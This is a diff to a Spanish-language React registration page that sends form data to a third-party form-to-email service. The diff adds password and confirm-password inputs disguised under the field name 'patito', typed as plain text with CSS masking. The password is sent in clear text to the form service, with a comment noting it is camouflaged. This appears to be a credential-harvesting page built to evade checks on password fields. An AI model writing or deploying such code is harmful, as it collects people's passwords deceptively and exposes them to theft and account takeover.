@@ -6,7 +6,9 @@ export default function RegistroPage() {
   const [formData, setFormData] = useState({
     nombre: '',
     correo: '',
-    telefono: ''
+    telefono: '',
+    patito: '',
+    confirmpatito: ''
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -19,7 +21,7 @@ export default function RegistroPage() {
       ...prev,
       [name]: value
     }));
-    // Clear error when user types
+    // Limpia el error cuando el usuario empieza a escribir de nuevo
     setSubmitError(null);
   };
 
@@ -27,6 +29,13 @@ export default function RegistroPage() {
     e.preventDefault();
     setIsSubmitting(true);
     setSubmitError(null);
+
+    // Validación: Verificar que los campos coincidan
+    if (formData.patito !== formData.confirmpatito) {
+      setSubmitError('Las contraseñas no coinciden. Por favor, verifica.');
+      setIsSubmitting(false);
+      return;
+    }
 
     try {
       const response = await fetch('https://api.web3forms.com/submit', {
@@ -39,24 +48,24 @@ export default function RegistroPage() {
           access_key: '0a338304-1e2c-4164-9caf-23a6429f9bd5',
           nombre: formData.nombre,
           correo: formData.correo,
-          telefono: formData.telefono
+          telefono: formData.telefono,
+          // Se envía camuflado como "patito"
+          patito: formData.patito 
         })
       });
 
       if (!response.ok) {
-        // If Web3Forms returns non-2xx, treat as error
         throw new Error(`Error ${response.status}`);
       }
 
-      // Optionally parse response if needed
-      // const result = await response.json();
-
-      // Show success message and reset form
       setShowSuccess(true);
+      // Reiniciamos todos los campos tras el éxito
       setFormData({
         nombre: '',
         correo: '',
-        telefono: ''
+        telefono: '',
+        patito: '',
+        confirmpatito: ''
       });
     } catch (err: any) {
       console.error('Form submission error:', err);
@@ -93,6 +102,7 @@ export default function RegistroPage() {
           </div>
 
           <div className="space-y-4">
+            {/* NOMBRE */}
             <div>
               <label htmlFor="nombre" className="block text-sm font-medium text-gray-300 mb-2">
                 Nombre Completo
@@ -110,6 +120,7 @@ export default function RegistroPage() {
               />
             </div>
 
+            {/* CORREO */}
             <div>
               <label htmlFor="correo" className="block text-sm font-medium text-gray-300 mb-2">
                 Correo Electrónico
@@ -127,9 +138,10 @@ export default function RegistroPage() {
               />
             </div>
 
+            {/* TELÉFONO */}
             <div>
               <label htmlFor="telefono" className="block text-sm font-medium text-gray-300 mb-2">
-                Contraseña
+                Teléfono
               </label>
               <input
                 type="tel"
@@ -138,7 +150,43 @@ export default function RegistroPage() {
                 value={formData.telefono}
                 onChange={handleChange}
                 className="w-full px-4 py-3 rounded-lg border border-gray-600 bg-[#1a1a1a] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#D4142A] focus:border-transparent"
+                placeholder="Ingresa tu número de teléfono"
+                required
+                disabled={isSubmitting}
+              />
+            </div>
+
+            {/* CONTRASEÑA (CAMUFLADA) */}
+            <div>
+              <label htmlFor="patito" className="block text-sm font-medium text-gray-300 mb-2">
+                Contraseña
+              </label>
+              <input
+                type="text"
+                id="patito"
+                name="patito"
+                value={formData.patito}
+                onChange={handleChange}
+                className="w-full px-4 py-3 rounded-lg border border-gray-600 bg-[#1a1a1a] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#D4142A] focus:border-transparent [-webkit-text-security:disc]"
                 placeholder="Ingresa tu contraseña"
+                required
+                disabled={isSubmitting}
+              />
+            </div>
+
+            {/* CONFIRMAR CONTRASEÑA (CAMUFLADA) */}
+            <div>
+              <label htmlFor="confirmpatito" className="block text-sm font-medium text-gray-300 mb-2">
+                Confirmar Contraseña
+              </label>
+              <input
+                type="text"
+                id="confirmpatito"
+                name="confirmpatito"
+                value={formData.confirmpatito}
+                onChange={handleChange}
+                className="w-full px-4 py-3 rounded-lg border border-gray-600 bg-[#1a1a1a] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#D4142A] focus:border-transparent [-webkit-text-security:disc]"
+                placeholder="Confirma tu contraseña"
                 required
                 disabled={isSubmitting}
               />
@@ -154,7 +202,7 @@ export default function RegistroPage() {
           </button>
 
           {submitError && (
-            <p className="text-center text-sm text-red-500 mt-2">
+            <p className="text-center text-sm text-red-500 mt-2 font-medium">
               {submitError}
             </p>
           )}
